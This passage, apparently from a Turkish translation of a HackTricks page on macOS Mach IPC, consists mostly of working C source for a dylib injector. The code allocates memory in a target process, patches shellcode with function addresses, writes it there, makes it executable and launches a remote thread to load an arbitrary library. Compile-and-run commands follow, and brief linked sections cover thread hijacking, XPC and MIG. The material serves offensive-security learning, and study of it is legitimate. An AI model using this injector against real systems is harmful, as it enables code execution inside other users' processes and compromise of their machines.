kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Uzak iş parçacığının kodu için bellek izinleri ayarlanamadı: Hata %s\n", mach_error_string(kr));
return (-4);
}

// Ayrılan yığın belleğinin izinlerini ayarlayın
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Uzak iş parçacığının yığını için bellek izinleri ayarlanamadı: Hata %s\n", mach_error_string(kr));
return (-4);
}


// Shellcode'u çalıştırmak için iş parçacığı oluşturun
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // bu gerçek yığın
//remoteStack64 -= 8;  // hizalamaya ihtiyaç var 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Uzak Yığın 64  0x%llx, Uzak kod %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Uzak iş parçacığı oluşturulamadı: hata %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Kullanım: %s _pid_ _eylem_\n", argv[0]);
fprintf (stderr, "   _eylem_: diskteki bir dylib dosyasının yolu\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib bulunamadı\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Görev Bağlantısı Aracılığıyla İş Parçacığı Kaçırma <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Bu teknikte, bir işlemin iş parçacığı kaçırılır:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Temel Bilgiler

XPC, macOS ve iOS üzerindeki işlemler arasındaki iletişimi sağlayan XNU (macOS tarafından kullanılan çekirdek) Arası İletişim anlamına gelir. XPC, sistemdeki farklı işlemler arasında güvenli, asenkron yöntem çağrıları yapmak için bir mekanizma sağlar. Bu, Apple'ın güvenlik paradigmasının bir parçası olup, her bileşenin yalnızca işini yapmak için gereken izinlere sahip olarak çalıştığı ayrıcalıklı uygulamaların oluşturulmasına olanak tanır ve bu şekilde bir işlem tarafından etkilenen zararı sınırlar.

Bu iletişimin nasıl çalıştığı ve nasıl savunmasız olabileceği hakkında daha fazla bilgi için:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Arayüzü Oluşturucusu

MIG, Mach IPC kodu oluşturma sürecini basitleştirmek için oluşturulmuştur. Temel olarak, sunucu ve istemcinin iletişim kurması için gereken kodu oluşturur. Oluşturulan kod ne kadar kötü görünürse görünsün, bir geliştirici sadece bunu içe aktarması ve kodu öncekinden çok daha basit hale getirecektir.

Daha fazla bilgi için kontrol edin:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Referanslar

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile öğrenin</strong>!</summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **tanıtmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>
